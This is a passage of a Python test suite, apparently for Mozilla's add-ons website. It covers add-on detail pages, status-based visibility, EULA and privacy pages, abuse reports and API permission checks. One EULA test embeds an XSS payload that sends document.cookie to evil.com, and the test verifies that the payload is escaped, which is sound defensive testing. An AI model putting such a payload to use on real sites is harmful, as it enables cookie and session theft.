        r = self.client.get(self.url)
        doc = pq(r.content)
        assert doc('h2.addon img').attr('src') == self.persona.icon_url
        style = doc('#persona div[data-browsertheme]').attr('style')
        assert self.persona.preview_url in style, (
            'style attribute %s does not link to %s' % (
                style, self.persona.preview_url))

    def test_more_personas(self):
        other = addon_factory(type=amo.ADDON_PERSONA)
        self.create_addon_user(other)
        r = self.client.get(self.url)
        assert pq(r.content)('#more-artist .more-link').length == 1

    def test_not_personas(self):
        other = addon_factory(type=amo.ADDON_EXTENSION)
        self.create_addon_user(other)
        r = self.client.get(self.url)
        assert pq(r.content)('#more-artist .more-link').length == 0

    def test_new_more_personas(self):
        other = addon_factory(type=amo.ADDON_PERSONA)
        self.create_addon_user(other)
        self.persona.persona_id = 0
        self.persona.save()
        r = self.client.get(self.url)
        profile = UserProfile.objects.get(id=999).get_url_path()
        assert pq(r.content)('#more-artist .more-link').attr('href') == (
            profile + '?src=addon-detail')

    def test_other_personas(self):
        """Ensure listed personas by the same author show up."""
        addon_factory(type=amo.ADDON_PERSONA, status=amo.STATUS_NULL)
        addon_factory(type=amo.ADDON_PERSONA, status=amo.STATUS_PUBLIC)
        addon_factory(type=amo.ADDON_PERSONA, disabled_by_user=True)

        other = addon_factory(type=amo.ADDON_PERSONA)
        self.create_addon_user(other)
        assert other.status == amo.STATUS_PUBLIC
        assert not other.disabled_by_user

        # TODO(cvan): Uncomment this once Personas detail page is impalacized.
        # doc = self.get_more_pq()('#author-addons')
        # _test_hovercards(self, doc, [other], src='dp-dl-othersby')

        r = self.client.get(self.url)
        assert list(r.context['author_personas']) == [other]
        a = pq(r.content)('#more-artist .persona.hovercard > a')
        assert a.length == 1
        assert a.attr('href') == other.get_url_path()

    def _test_by(self):
        """Test that the by... bit works."""
        r = self.client.get(self.url)
        assert pq(r.content)('h4.author').text().startswith('by regularuser')

    def test_by(self):
        self._test_by()


class TestStatus(TestCase):
    fixtures = ['base/addon_3615', 'addons/persona']

    def setUp(self):
        super(TestStatus, self).setUp()
        self.addon = Addon.objects.get(id=3615)
        self.version = self.addon.current_version
        self.file = self.version.all_files[0]
        assert self.addon.status == amo.STATUS_PUBLIC
        self.url = self.addon.get_url_path()

        self.persona = Addon.objects.get(id=15663)
        assert self.persona.status == amo.STATUS_PUBLIC
        self.persona_url = self.persona.get_url_path()

    def test_incomplete(self):
        self.addon.update(status=amo.STATUS_NULL)
        assert self.client.get(self.url).status_code == 404

    def test_pending(self):
        self.addon.update(status=amo.STATUS_PENDING)
        assert self.client.get(self.url).status_code == 404

    def test_nominated(self):
        self.addon.update(status=amo.STATUS_NOMINATED)
        assert self.client.get(self.url).status_code == 200

    def test_public(self):
        self.addon.update(status=amo.STATUS_PUBLIC)
        assert self.client.get(self.url).status_code == 200

    def test_deleted(self):
        self.addon.update(status=amo.STATUS_DELETED)
        assert self.client.get(self.url).status_code == 404

    def test_disabled(self):
        self.addon.update(status=amo.STATUS_DISABLED)
        assert self.client.get(self.url).status_code == 404

    def test_disabled_by_user(self):
        self.addon.update(disabled_by_user=True)
        assert self.client.get(self.url).status_code == 404

    def test_persona(self):
        for status in Persona.STATUS_CHOICES.keys():
            if status == amo.STATUS_DELETED:
                continue
            self.persona.status = status
            self.persona.save()
            assert self.client.head(self.persona_url).status_code == (
                200 if status in [amo.STATUS_PUBLIC, amo.STATUS_PENDING]
                else 404)

    def test_persona_disabled(self):
        for status in Persona.STATUS_CHOICES.keys():
            if status == amo.STATUS_DELETED:
                continue
            self.persona.status = status
            self.persona.disabled_by_user = True
            self.persona.save()
            assert self.client.head(self.persona_url).status_code == 404


class TestTagsBox(TestCase):
    fixtures = ['base/addontag']

    def test_tag_box(self):
        """Verify that we don't show duplicate tags."""
        r = self.client.get_ajax(reverse('addons.detail_more', args=[8680]),
                                 follow=True)
        doc = pq(r.content)
        assert 'SEO' == doc('#tagbox ul').children().text()


class TestEulaPolicyRedirects(TestCase):

    def test_eula_legacy_url(self):
        """
        See that we get a 301 to the zamboni style URL
        """
        response = self.client.get('/en-US/firefox/addons/policy/0/592/42')
        assert response.status_code == 301
        assert (response['Location'].find('/addon/592/eula/42') != -1)

    def test_policy_legacy_url(self):
        """
        See that we get a 301 to the zamboni style URL
        """
        response = self.client.get('/en-US/firefox/addons/policy/0/592/')
        assert response.status_code == 301
        assert (response['Location'].find('/addon/592/privacy/') != -1)


class TestEula(TestCase):
    fixtures = ['addons/eula+contrib-addon']

    def setUp(self):
        super(TestEula, self).setUp()
        self.addon = Addon.objects.get(id=11730)
        self.url = self.get_url()

    def get_url(self, args=None):
        if args is None:
            args = []
        return reverse('addons.eula', args=[self.addon.slug] + args)

    def test_current_version(self):
        r = self.client.get(self.url)
        assert r.context['version'] == self.addon.current_version

    def test_simple_html_is_rendered(self):
        self.addon.eula = """
            <strong> what the hell..</strong>
            <ul>
                <li>papparapara</li>
                <li>todotodotodo</li>
            </ul>
            <ol>
                <a href="irc://irc.mozilla.org/firefox">firefox</a>

                Introduce yourself to the community, if you like!
                This text will appear publicly on your user info page.
                <li>papparapara2</li>
                <li>todotodotodo2</li>
            </ol>
            """
        self.addon.save()

        r = self.client.get(self.url)
        doc = pq(r.content)

        assert norm(doc('.policy-statement strong')) == (
            '<strong> what the hell..</strong>')
        assert norm(doc('.policy-statement ul')) == (
            '<ul><li>papparapara</li><li>todotodotodo</li></ul>')
        assert doc('.policy-statement ol a').text() == 'firefox'
        assert norm(doc('.policy-statement ol li:first')) == (
            '<li>papparapara2</li>')

    def test_evil_html_is_not_rendered(self):
        self.addon.eula = """
            <script type="text/javascript">
                window.location = 'http://evil.com/?c=' + document.cookie;
            </script>
            Muhuhahahahahahaha!
            """
        self.addon.save()

        r = self.client.get(self.url)
        doc = pq(r.content)

        policy = str(doc('.policy-statement'))
        assert policy.startswith('<div class="policy-statement">&lt;script'), (
            'Unexpected: %s' % policy[:50])

    def test_old_version(self):
        old = self.addon.versions.order_by('created')[0]
        assert old != self.addon.current_version
        r = self.client.get(self.get_url([old.all_files[0].id]))
        assert r.context['version'] == old

    def test_deleted_version(self):
        old = self.addon.versions.order_by('created')[0]
        assert old != self.addon.current_version
        old.delete()
        response = self.client.get(self.get_url([old.all_files[0].id]))
        assert response.status_code == 404

    def test_redirect_no_eula(self):
        self.addon.update(eula=None)
        r = self.client.get(self.url, follow=True)
        self.assert3xx(r, self.addon.get_url_path())

    def test_cat_sidebar(self):
        check_cat_sidebar(self.url, self.addon)


class TestXssOnName(amo.tests.TestXss):

    def test_eula_page(self):
        url = reverse('addons.eula', args=[self.addon.slug])
        self.assertNameAndNoXSS(url)

    def test_detail_page(self):
        url = reverse('addons.detail', args=[self.addon.slug])
        self.assertNameAndNoXSS(url)

    def test_privacy_page(self):
        url = reverse('addons.privacy', args=[self.addon.slug])
        self.assertNameAndNoXSS(url)

    def test_reviews_list(self):
        url = reverse('addons.ratings.list', args=[self.addon.slug])
        self.assertNameAndNoXSS(url)

    def test_reviews_add(self):
        url = reverse('addons.ratings.add', args=[self.addon.slug])
        self.client.login(email='fligtar@gmail.com')
        self.assertNameAndNoXSS(url)


class TestPrivacyPolicy(TestCase):
    fixtures = ['addons/eula+contrib-addon']

    def setUp(self):
        super(TestPrivacyPolicy, self).setUp()
        self.addon = Addon.objects.get(id=11730)
        self.url = reverse('addons.privacy', args=[self.addon.slug])

    def test_redirect_no_eula(self):
        assert self.addon.privacy_policy is None
        r = self.client.get(self.url, follow=True)
        self.assert3xx(r, self.addon.get_url_path())

    def test_cat_sidebar(self):
        self.addon.privacy_policy = 'shizzle'
        self.addon.save()
        check_cat_sidebar(self.url, self.addon)


@patch.object(settings, 'NOBOT_RECAPTCHA_PRIVATE_KEY', 'something')
class TestReportAbuse(TestCase):
    fixtures = ['addons/persona', 'base/addon_3615', 'base/users']

    def setUp(self):
        super(TestReportAbuse, self).setUp()
        self.full_page = reverse('addons.abuse', args=['a3615'])

    @patch('olympia.amo.fields.ReCaptchaField.clean')
    def test_abuse_anonymous(self, clean):
        clean.return_value = ""
        self.client.post(self.full_page, {'text': 'spammy'})
        assert len(mail.outbox) == 1
        assert 'spammy' in mail.outbox[0].body
        report = AbuseReport.objects.get(addon=3615)
        assert report.message == 'spammy'
        assert report.reporter is None

    def test_abuse_anonymous_fails(self):
        r = self.client.post(self.full_page, {'text': 'spammy'})
        assert 'recaptcha' in r.context['abuse_form'].errors

    def test_abuse_logged_in(self):
        self.client.login(email='regular@mozilla.com')
        self.client.post(self.full_page, {'text': 'spammy'})
        assert len(mail.outbox) == 1
        assert 'spammy' in mail.outbox[0].body
        report = AbuseReport.objects.get(addon=3615)
        assert report.message == 'spammy'
        assert report.reporter.email == 'regular@mozilla.com'

    def test_abuse_name(self):
        addon = Addon.objects.get(pk=3615)
        addon.name = 'Bmrk.ru Социальные закладки'
        addon.save()

        self.client.login(email='regular@mozilla.com')
        self.client.post(self.full_page, {'text': 'spammy'})
        assert 'spammy' in mail.outbox[0].body
        assert AbuseReport.objects.get(addon=addon)

    def test_abuse_persona(self):
        shared_url = reverse('addons.detail', args=['a15663'])
        r = self.client.get(shared_url)
        doc = pq(r.content)
        assert doc("fieldset.abuse")

        # and now just test it works
        self.client.login(email='regular@mozilla.com')
        r = self.client.post(reverse('addons.abuse', args=['a15663']),
                             {'text': 'spammy'})
        self.assert3xx(r, shared_url)
        assert len(mail.outbox) == 1
        assert 'spammy' in mail.outbox[0].body
        assert AbuseReport.objects.get(addon=15663)


class TestFindReplacement(TestCase):
    def test_no_match(self):
        self.url = reverse('addons.find_replacement') + '?guid=xxx'
        response = self.client.get(self.url)
        self.assert3xx(
            response,
            DEFAULT_FIND_REPLACEMENT_PATH + '?src=%s' % FIND_REPLACEMENT_SRC)

    def test_match(self):
        addon_factory(slug='replacey')
        ReplacementAddon.objects.create(guid='xxx', path='/addon/replacey/')
        self.url = reverse('addons.find_replacement') + '?guid=xxx'
        response = self.client.get(self.url)
        self.assert3xx(
            response, '/addon/replacey/?src=%s' % FIND_REPLACEMENT_SRC)

    def test_match_no_leading_slash(self):
        addon_factory(slug='replacey')
        ReplacementAddon.objects.create(guid='xxx', path='addon/replacey/')
        self.url = reverse('addons.find_replacement') + '?guid=xxx'
        response = self.client.get(self.url)
        self.assert3xx(
            response, '/addon/replacey/?src=%s' % FIND_REPLACEMENT_SRC)

    def test_no_guid_param_is_404(self):
        self.url = reverse('addons.find_replacement')
        response = self.client.get(self.url)
        assert response.status_code == 404

    def test_external_url(self):
        ReplacementAddon.objects.create(
            guid='xxx', path='https://mozilla.org/')
        self.url = reverse('addons.find_replacement') + '?guid=xxx'
        response = self.client.get(self.url)
        self.assert3xx(
            response, get_outgoing_url('https://mozilla.org/'))


class AddonAndVersionViewSetDetailMixin(object):
    """Tests that play with addon state and permissions. Shared between addon
    and version viewset detail tests since both need to react the same way."""
    def _test_url(self):
        raise NotImplementedError

    def _set_tested_url(self, param):
        raise NotImplementedError

    def test_get_by_id(self):
        self._test_url()

    def test_get_by_slug(self):
        self._set_tested_url(self.addon.slug)
        self._test_url()

    def test_get_by_guid(self):
        self._set_tested_url(self.addon.guid)
        self._test_url()

    def test_get_by_guid_uppercase(self):
        self._set_tested_url(self.addon.guid.upper())
        self._test_url()

    def test_get_by_guid_email_format(self):
        self.addon.update(guid='my-addon@example.tld')
        self._set_tested_url(self.addon.guid)
        self._test_url()

    def test_get_by_guid_email_short_format(self):
        self.addon.update(guid='@example.tld')
        self._set_tested_url(self.addon.guid)
        self._test_url()

    def test_get_by_guid_email_really_short_format(self):
        self.addon.update(guid='@example')
        self._set_tested_url(self.addon.guid)
        self._test_url()

    def test_get_not_public_anonymous(self):
        self.addon.update(status=amo.STATUS_NOMINATED)
        response = self.client.get(self.url)
        assert response.status_code == 401
        data = json.loads(response.content)
        assert data['detail'] == (
            'Authentication credentials were not provided.')
        assert data['is_disabled_by_developer'] is False
        assert data['is_disabled_by_mozilla'] is False

    def test_get_not_public_no_rights(self):
        self.addon.update(status=amo.STATUS_NOMINATED)
        user = UserProfile.objects.create(username='simpleuser')
        self.client.login_api(user)
        response = self.client.get(self.url)
        assert response.status_code == 403
        data = json.loads(response.content)
        assert data['detail'] == (
            'You do not have permission to perform this action.')
        assert data['is_disabled_by_developer'] is False
        assert data['is_disabled_by_mozilla'] is False

    def test_get_not_public_reviewer(self):
        self.addon.update(status=amo.STATUS_NOMINATED)
        user = UserProfile.objects.create(username='reviewer')
        self.grant_permission(user, 'Addons:Review')
        self.client.login_api(user)
        response = self.client.get(self.url)
        assert response.status_code == 200

    def test_get_not_public_author(self):
        self.addon.update(status=amo.STATUS_NOMINATED)
        user = UserProfile.objects.create(username='author')
        AddonUser.objects.create(user=user, addon=self.addon)
        self.client.login_api(user)
        response = self.client.get(self.url)
        assert response.status_code == 200

    def test_get_disabled_by_user_anonymous(self):
        self.addon.update(disabled_by_user=True)
        response = self.client.get(self.url)
        assert response.status_code == 401
        data = json.loads(response.content)
        assert data['detail'] == (
            'Authentication credentials were not provided.')
        assert data['is_disabled_by_developer'] is True
        assert data['is_disabled_by_mozilla'] is False

    def test_get_disabled_by_user_other_user(self):
        self.addon.update(disabled_by_user=True)
        user = UserProfile.objects.create(username='someone')
        self.client.login_api(user)
        response = self.client.get(self.url)
        assert response.status_code == 403
        data = json.loads(response.content)
        assert data['detail'] == (
            'You do not have permission to perform this action.')
        assert data['is_disabled_by_developer'] is True
        assert data['is_disabled_by_mozilla'] is False

    def test_disabled_by_admin_anonymous(self):
        self.addon.update(status=amo.STATUS_DISABLED)
        response = self.client.get(self.url)
        assert response.status_code == 401
        data = json.loads(response.content)
        assert data['detail'] == (
            'Authentication credentials were not provided.')
        assert data['is_disabled_by_developer'] is False
        assert data['is_disabled_by_mozilla'] is True

    def test_disabled_by_admin_no_rights(self):
        self.addon.update(status=amo.STATUS_DISABLED)
        user = UserProfile.objects.create(username='someone')
        self.client.login_api(user)
        response = self.client.get(self.url)
        assert response.status_code == 403
        data = json.loads(response.content)
        assert data['detail'] == (
            'You do not have permission to perform this action.')
        assert data['is_disabled_by_developer'] is False
        assert data['is_disabled_by_mozilla'] is True

    def test_get_not_listed(self):
        self.make_addon_unlisted(self.addon)
        response = self.client.get(self.url)
        assert response.status_code == 401
        data = json.loads(response.content)
        assert data['detail'] == (
            'Authentication credentials were not provided.')
        assert data['is_disabled_by_developer'] is False
        assert data['is_disabled_by_mozilla'] is False

    def test_get_not_listed_no_rights(self):
        user = UserProfile.objects.create(username='simpleuser')
        self.make_addon_unlisted(self.addon)
        self.client.login_api(user)
        response = self.client.get(self.url)
        assert response.status_code == 403
        data = json.loads(response.content)
        assert data['detail'] == (
            'You do not have permission to perform this action.')
        assert data['is_disabled_by_developer'] is False
        assert data['is_disabled_by_mozilla'] is False

    def test_get_not_listed_simple_reviewer(self):
        user = UserProfile.objects.create(username='reviewer')
        self.grant_permission(user, 'Addons:Review')
        self.make_addon_unlisted(self.addon)
        self.client.login_api(user)
        response = self.client.get(self.url)
        assert response.status_code == 403
        data = json.loads(response.content)
        assert data['detail'] == (
            'You do not have permission to perform this action.')
        assert data['is_disabled_by_developer'] is False
        assert data['is_disabled_by_mozilla'] is False

    def test_get_not_listed_specific_reviewer(self):
        user = UserProfile.objects.create(username='reviewer')
        self.grant_permission(user, 'Addons:ReviewUnlisted')
        self.make_addon_unlisted(self.addon)
        self.client.login_api(user)
        response = self.client.get(self.url)
        assert response.status_code == 200

    def test_get_not_listed_author(self):
        user = UserProfile.objects.create(username='author')
        AddonUser.objects.create(user=user, addon=self.addon)
        self.make_addon_unlisted(self.addon)
        self.client.login_api(user)
        response = self.client.get(self.url)
        assert response.status_code == 200

    def test_get_deleted(self):
        self.addon.delete()
        response = self.client.get(self.url)
        assert response.status_code == 404
        data = json.loads(response.content)
        assert data['detail'] == 'Not found.'
        # `is_disabled_by_developer` and `is_disabled_by_mozilla` are only
        # added for 401/403.
        assert 'is_disabled_by_developer' not in data
        assert 'is_disabled_by_mozilla' not in data

    def test_get_deleted_no_rights(self):
        self.addon.delete()
        user = UserProfile.objects.create(username='simpleuser')
        self.client.login_api(user)
        response = self.client.get(self.url)
        assert response.status_code == 404
        data = json.loads(response.content)
        assert data['detail'] == 'Not found.'
        # `is_disabled_by_developer` and `is_disabled_by_mozilla` are only
        # added for 401/403.
        assert 'is_disabled_by_developer' not in data
        assert 'is_disabled_by_mozilla' not in data

    def test_get_deleted_reviewer(self):
        user = UserProfile.objects.create(username='reviewer')
        self.grant_permission(user, 'Addons:Review')
        self.addon.delete()
        self.client.login_api(user)
        response = self.client.get(self.url)
        assert response.status_code == 404
        data = json.loads(response.content)
        assert data['detail'] == 'Not found.'
        # `is_disabled_by_developer` and `is_disabled_by_mozilla` are only
        # added for 401/403.
        assert 'is_disabled_by_developer' not in data
        assert 'is_disabled_by_mozilla' not in data

    def test_get_deleted_admin(self):
        user = UserProfile.objects.create(username='admin')
        self.grant_permission(user, 'Addons:ViewDeleted,Addons:Review')
        self.addon.delete()
        self.client.login_api(user)
        response = self.client.get(self.url)
        assert response.status_code == 200

    def test_get_deleted_author(self):
        # Owners can't see their own add-on once deleted, only admins can.
        user = UserProfile.objects.create(username='author')
        AddonUser.objects.create(user=user, addon=self.addon)
        self.addon.delete()
        self.client.login_api(user)
        response = self.client.get(self.url)
        assert response.status_code == 404
        data = json.loads(response.content)
        assert data['detail'] == 'Not found.'
        # `is_disabled_by_developer` and `is_disabled_by_mozilla` are only
        # added for 401/403.
        assert 'is_disabled_by_developer' not in data
        assert 'is_disabled_by_mozilla' not in data

    def test_get_addon_not_found(self):
        self._set_tested_url(self.addon.pk + 42)
        response = self.client.get(self.url)
        assert response.status_code == 404
        data = json.loads(response.content)
        assert data['detail'] == 'Not found.'
        # `is_disabled_by_developer` and `is_disabled_by_mozilla` are only
        # added for 401/403.
        assert 'is_disabled_by_developer' not in data
        assert 'is_disabled_by_mozilla' not in data


class TestAddonViewSetDetail(AddonAndVersionViewSetDetailMixin, TestCase):
    client_class = APITestClient

    def setUp(self):
        super(TestAddonViewSetDetail, self).setUp()
        self.addon = addon_factory(
            guid=generate_addon_guid(), name=u'My Addôn', slug='my-addon')
        self._set_tested_url(self.addon.pk)

    def _test_url(self):
        response = self.client.get(self.url)
        assert response.status_code == 200
        result = json.loads(response.content)
        assert result['id'] == self.addon.pk
        assert result['name'] == {'en-US': u'My Addôn'}
        assert result['slug'] == self.addon.slug
        assert result['last_updated'] == (
            self.addon.last_updated.replace(microsecond=0).isoformat() + 'Z')
        return result

    def _set_tested_url(self, param):
        self.url = reverse('v3:addon-detail', kwargs={'pk': param})

    def test_detail_url_with_reviewers_in_the_url(self):
        self.addon.update(slug='something-reviewers')
        self.url = reverse('v3:addon-detail', kwargs={'pk': self.addon.slug})
        self._test_url()

    def test_hide_latest_unlisted_version_anonymous(self):
        unlisted_version = version_factory(
            addon=self.addon, channel=amo.RELEASE_CHANNEL_UNLISTED)
        unlisted_version.update(created=self.days_ago(1))
        result = self._test_url()
        assert 'latest_unlisted_version' not in result

    def test_hide_latest_unlisted_version_simple_reviewer(self):
        user = UserProfile.objects.create(username='reviewer')
        self.grant_permission(user, 'Addons:Review')
        self.client.login_api(user)

        unlisted_version = version_factory(
            addon=self.addon, channel=amo.RELEASE_CHANNEL_UNLISTED)
        unlisted_version.update(created=self.days_ago(1))
        result = self._test_url()
        assert 'latest_unlisted_version' not in result

    def test_show_latest_unlisted_version_author(self):
        user = UserProfile.objects.create(username='author')
        AddonUser.objects.create(user=user, addon=self.addon)
        self.client.login_api(user)

        unlisted_version = version_factory(
            addon=self.addon, channel=amo.RELEASE_CHANNEL_UNLISTED)
        unlisted_version.update(created=self.days_ago(1))
        result = self._test_url()
        assert result['latest_unlisted_version']
        assert result['latest_unlisted_version']['id'] == unlisted_version.pk

    def test_show_latest_unlisted_version_unlisted_reviewer(self):
        user = UserProfile.objects.create(username='author')
        self.grant_permission(user, 'Addons:ReviewUnlisted')
        self.client.login_api(user)

        unlisted_version = version_factory(
            addon=self.addon, channel=amo.RELEASE_CHANNEL_UNLISTED)
        unlisted_version.update(created=self.days_ago(1))
        result = self._test_url()
        assert result['latest_unlisted_version']
        assert result['latest_unlisted_version']['id'] == unlisted_version.pk

    def test_with_lang(self):
        self.addon.name = {
            'en-US': u'My Addôn, mine',
            'fr': u'Mon Addôn, le mien',
        }
        self.addon.save()
        response = self.client.get(self.url, {'lang': 'en-US'})
        assert response.status_code == 200
        result = json.loads(response.content)
        assert result['id'] == self.addon.pk
        assert result['name'] == u'My Addôn, mine'

        response = self.client.get(self.url, {'lang': 'fr'})
        assert response.status_code == 200
        result = json.loads(response.content)
        assert result['id'] == self.addon.pk
        assert result['name'] == u'Mon Addôn, le mien'

        response = self.client.get(self.url, {'lang': 'en-US'})
        assert response.status_code == 200
        result = json.loads(response.content)
        assert result['id'] == self.addon.pk
        assert result['name'] == u'My Addôn, mine'


class TestVersionViewSetDetail(AddonAndVersionViewSetDetailMixin, TestCase):
    client_class = APITestClient

    def setUp(self):
        super(TestVersionViewSetDetail, self).setUp()
        self.addon = addon_factory(
            guid=generate_addon_guid(), name=u'My Addôn', slug='my-addon')

        # Don't use addon.current_version, changing its state as we do in
        # the tests might render the add-on itself inaccessible.
        self.version = version_factory(addon=self.addon)
        self._set_tested_url(self.addon.pk)

    def _test_url(self):
        response = self.client.get(self.url)
        assert response.status_code == 200
        result = json.loads(response.content)
        assert result['id'] == self.version.pk
        assert result['version'] == self.version.version

    def _set_tested_url(self, param):
        self.url = reverse('v3:addon-version-detail', kwargs={
            'addon_pk': param, 'pk': self.version.pk})

    def test_version_get_not_found(self):
        self.url = reverse('v3:addon-version-detail', kwargs={
            'addon_pk': self.addon.pk, 'pk': self.version.pk + 42})
        response = self.client.get(self.url)
        assert response.status_code == 404

    def test_disabled_version_reviewer(self):
        user = UserProfile.objects.create(username='reviewer')
        self.grant_permission(user, 'Addons:Review')
        self.client.login_api(user)
        self.version.files.update(status=amo.STATUS_DISABLED)
        self._test_url()

    def test_disabled_version_author(self):
        user = UserProfile.objects.create(username='author')
        AddonUser.objects.create(user=user, addon=self.addon)
        self.client.login_api(user)
        self.version.files.update(status=amo.STATUS_DISABLED)
        self._test_url()

    def test_disabled_version_admin(self):
        user = UserProfile.objects.create(username='admin')
        self.grant_permission(user, '*:*')
        self.client.login_api(user)
        self.version.files.update(status=amo.STATUS_DISABLED)
        self._test_url()

    def test_disabled_version_anonymous(self):
        self.version.files.update(status=amo.STATUS_DISABLED)
        response = self.client.get(self.url)
        assert response.status_code == 401

    def test_disabled_version_user_but_not_author(self):
        user = UserProfile.objects.create(username='simpleuser')
        self.client.login_api(user)
        self.version.files.update(status=amo.STATUS_DISABLED)
        response = self.client.get(self.url)
        assert response.status_code == 403

    def test_deleted_version_reviewer(self):
        user = UserProfile.objects.create(username='reviewer')
        self.grant_permission(user, 'Addons:Review')
        self.client.login_api(user)
        self.version.delete()
        response = self.client.get(self.url)
        assert response.status_code == 404

    def test_deleted_version_author(self):
        user = UserProfile.objects.create(username='author')
        AddonUser.objects.create(user=user, addon=self.addon)
        self.client.login_api(user)
        self.version.delete()
        response = self.client.get(self.url)
        assert response.status_code == 404

    def test_deleted_version_admin(self):
        user = UserProfile.objects.create(username='admin')
        self.grant_permission(user, '*:*')
        self.client.login_api(user)
        self.version.delete()
        self._test_url()

    def test_deleted_version_anonymous(self):
        self.version.delete()
        response = self.client.get(self.url)
        assert response.status_code == 404

    def test_deleted_version_user_but_not_author(self):
        user = UserProfile.objects.create(username='simpleuser')
        self.client.login_api(user)
        self.version.delete()
        response = self.client.get(self.url)
        assert response.status_code == 404

    def test_unlisted_version_reviewer(self):
        user = UserProfile.objects.create(username='reviewer')
        self.grant_permission(user, 'Addons:Review')
        self.client.login_api(user)
        self.version.update(channel=amo.RELEASE_CHANNEL_UNLISTED)
        response = self.client.get(self.url)
        assert response.status_code == 403

    def test_unlisted_version_unlisted_reviewer(self):
        user = UserProfile.objects.create(username='reviewer')
        self.grant_permission(user, 'Addons:ReviewUnlisted')
        self.client.login_api(user)
        self.version.update(channel=amo.RELEASE_CHANNEL_UNLISTED)
        self._test_url()

    def test_unlisted_version_author(self):
        user = UserProfile.objects.create(username='author')
        AddonUser.objects.create(user=user, addon=self.addon)
        self.client.login_api(user)
        self.version.update(channel=amo.RELEASE_CHANNEL_UNLISTED)
        self._test_url()

    def test_unlisted_version_admin(self):
        user = UserProfile.objects.create(username='admin')
        self.grant_permission(user, '*:*')
        self.client.login_api(user)
        self.version.update(channel=amo.RELEASE_CHANNEL_UNLISTED)
        self._test_url()

    def test_unlisted_version_anonymous(self):
        self.version.update(channel=amo.RELEASE_CHANNEL_UNLISTED)
        response = self.client.get(self.url)
        assert response.status_code == 401

    def test_unlisted_version_user_but_not_author(self):
        user = UserProfile.objects.create(username='simpleuser')
        self.client.login_api(user)
        self.version.update(channel=amo.RELEASE_CHANNEL_UNLISTED)
        response = self.client.get(self.url)
        assert response.status_code == 403


class TestVersionViewSetList(AddonAndVersionViewSetDetailMixin, TestCase):
    client_class = APITestClient

    def setUp(self):
        super(TestVersionViewSetList, self).setUp()
        self.addon = addon_factory(
            guid=generate_addon_guid(), name=u'My Addôn', slug='my-addon')
        self.old_version = self.addon.current_version
        self.old_version.update(created=self.days_ago(2))

        # Don't use addon.current_version, changing its state as we do in
        # the tests might render the add-on itself inaccessible.
        self.version = version_factory(addon=self.addon, version='1.0.1')
        self.version.update(created=self.days_ago(1))

        # This version is unlisted and should be hidden by default, only
        # shown when requesting to see unlisted stuff explicitly, with the
        # right permissions.
        self.unlisted_version = version_factory(
            addon=self.addon, version='42.0',
            channel=amo.RELEASE_CHANNEL_UNLISTED)

        self._set_tested_url(self.addon.pk)

    def _test_url(self, **kwargs):
        response = self.client.get(self.url, data=kwargs)
        assert response.status_code == 200
        result = json.loads(response.content)
        assert result['results']
        assert len(result['results']) == 2
        result_version = result['results'][0]
        assert result_version['id'] == self.version.pk
        assert result_version['version'] == self.version.version
        result_version = result['results'][1]
        assert result_version['id'] == self.old_version.pk
        assert result_version['version'] == self.old_version.version

    def _test_url_contains_all(self, **kwargs):
        response = self.client.get(self.url, data=kwargs)
        assert response.status_code == 200
        result = json.loads(response.content)
        assert result['results']
        assert len(result['results']) == 3
        result_version = result['results'][0]
        assert result_version['id'] == self.unlisted_version.pk
        assert result_version['version'] == self.unlisted_version.version
        result_version = result['results'][1]
        assert result_version['id'] == self.version.pk
        assert result_version['version'] == self.version.version
        result_version = result['results'][2]
        assert result_version['id'] == self.old_version.pk
        assert result_version['version'] == self.old_version.version

    def _test_url_only_contains_old_version(self, **kwargs):
        response = self.client.get(self.url, data=kwargs)
        assert response.status_code == 200
        result = json.loads(response.content)
        assert result['results']
        assert len(result['results']) == 1
        result_version = result['results'][0]
        assert result_version['id'] == self.old_version.pk
        assert result_version['version'] == self.old_version.version

    def _set_tested_url(self, param):
        self.url = reverse('v3:addon-version-list', kwargs={'addon_pk': param})

    def test_bad_filter(self):
        response = self.client.get(self.url, data={'filter': 'ahahaha'})
        assert response.status_code == 400
        data = json.loads(response.content)
        assert data == ['Invalid "filter" parameter specified.']

    def test_disabled_version_reviewer(self):
        user = UserProfile.objects.create(username='reviewer')
        self.grant_permission(user, 'Addons:Review')
        self.client.login_api(user)
        self.version.files.update(status=amo.STATUS_DISABLED)
        self._test_url_only_contains_old_version()

        # A reviewer can see disabled versions when explicitly asking for them.
        self._test_url(filter='all_without_unlisted')

    def test_disabled_version_author(self):
        user = UserProfile.objects.create(username='author')
        AddonUser.objects.create(user=user, addon=self.addon)
        self.client.login_api(user)
        self.version.files.update(status=amo.STATUS_DISABLED)
        self._test_url_only_contains_old_version()

        # An author can see disabled versions when explicitly asking for them.
        self._test_url(filter='all_without_unlisted')

    def test_disabled_version_admin(self):
        user = UserProfile.objects.create(username='admin')
        self.grant_permission(user, '*:*')
        self.client.login_api(user)
        self.version.files.update(status=amo.STATUS_DISABLED)
        self._test_url_only_contains_old_version()

        # An admin can see disabled versions when explicitly asking for them.
        self._test_url(filter='all_without_unlisted')

    def test_disabled_version_anonymous(self):
        self.version.files.update(status=amo.STATUS_DISABLED)
        self._test_url_only_contains_old_version()
        response = self.client.get(
            self.url, data={'filter': 'all_without_unlisted'})
        assert response.status_code == 401
        response = self.client.get(
            self.url, data={'filter': 'all_with_deleted'})
        assert response.status_code == 401

    def test_disabled_version_user_but_not_author(self):
        user = UserProfile.objects.create(username='simpleuser')
        self.client.login_api(user)
        self.version.files.update(status=amo.STATUS_DISABLED)
        self._test_url_only_contains_old_version()
        response = self.client.get(
            self.url, data={'filter': 'all_without_unlisted'})
        assert response.status_code == 403
        response = self.client.get(
            self.url, data={'filter': 'all_with_deleted'})
        assert response.status_code == 403

    def test_deleted_version_reviewer(self):
        user = UserProfile.objects.create(username='reviewer')
        self.grant_permission(user, 'Addons:Review')
        self.client.login_api(user)
        self.version.delete()
        self._test_url_only_contains_old_version()
        self._test_url_only_contains_old_version(filter='all_without_unlisted')
        response = self.client.get(
            self.url, data={'filter': 'all_with_deleted'})
        assert response.status_code == 403
        response = self.client.get(
            self.url, data={'filter': 'all_with_unlisted'})
        assert response.status_code == 403

    def test_deleted_version_author(self):
        user = UserProfile.objects.create(username='author')
        AddonUser.objects.create(user=user, addon=self.addon)
        self.client.login_api(user)
        self.version.delete()
        self._test_url_only_contains_old_version()
        self._test_url_only_contains_old_version(filter='all_without_unlisted')
        response = self.client.get(
            self.url, data={'filter': 'all_with_deleted'})
        assert response.status_code == 403

    def test_deleted_version_admin(self):
        user = UserProfile.objects.create(username='admin')
        self.grant_permission(user, '*:*')
        self.client.login_api(user)
        self.version.delete()
        self._test_url_only_contains_old_version()
